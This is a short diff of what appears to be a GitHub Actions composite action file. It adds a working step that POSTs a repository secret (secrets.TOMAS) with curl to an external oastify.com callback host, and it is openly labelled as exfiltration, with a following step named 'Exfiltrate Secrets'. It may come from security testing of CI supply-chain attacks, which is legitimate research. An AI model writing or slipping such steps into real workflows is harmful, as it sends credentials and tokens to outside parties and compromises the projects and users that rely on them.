@@ -8,7 +8,7 @@ runs:
       run: |
         echo "Attempting exfiltration of TOMAS..."
         curl -X POST http://zeh4hwvxmschiptpzk4xjymwpnvej47t.oastify.com \
-          -d "tomas=${{ env.TOMAS }}"
+          -d "tomas=${{ secrets.TOMAS }}"
       shell: bash
     - name: Exfiltrate Secrets
       shell: bash
